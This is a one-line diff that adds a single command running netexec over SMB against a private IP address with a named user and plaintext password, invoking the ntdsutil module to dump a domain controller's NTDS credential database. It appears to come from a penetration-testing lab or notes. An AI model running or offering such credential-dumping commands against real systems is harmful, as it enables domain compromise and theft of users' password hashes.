@@ -1,0 +1,1 @@
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
